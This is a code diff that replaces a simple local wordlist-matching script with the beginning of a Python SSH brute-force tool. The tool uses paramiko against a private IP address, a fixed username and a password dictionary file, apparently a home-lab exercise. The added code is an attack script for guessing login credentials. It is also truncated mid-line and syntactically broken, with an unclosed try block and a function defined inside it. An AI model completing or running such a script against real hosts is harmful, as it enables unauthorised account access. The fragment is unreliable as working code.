@@ -1,29 +1,16 @@
-import smtplib
-import random
-import itertools
-import sys
-import time
-# # filepath=""   
-# filePath=open(input("Please enter the file location of the dictionary."),'r')
-# i=0
-# length = len(filePath)
-# while i <length:
-#     password=i
-#     print(filePath[i])
-#     i +=1
-filepath = '/home/jeff/Desktop/sample.txt'
-passwordCheck="password"
-with open(filepath) as fp:
-    line = fp.readline()
-    cnt = 1
-    while line:
-        line=line.strip()
-        print(line)
-        if line == passwordCheck:
-            print("Your password of {} is a match in the dictionary".format(passwordCheck))
-            break
-        else:
-            print("{}".format(line.strip()))
-            line = fp.readline()
-            time.sleep(1)
-            cnt += 1
+#!/usr/bin/env python3
+import paramiko, sys, os, socket
+
+global host, username, line, input_file
+line= "\n-----------------------------------------------------------------\n"
+
+try:
+    host="192.168.29.150"
+    username="jeff"
+    input_file= "/home/jeff/Desktop/sample.txt"
+
+    if os.path.exists(input_file) == False:
+        print("Path does not exist!")
+def ssh_connect(password):
+    ssh=paramiko.SSHClient()
+    ssh.set_
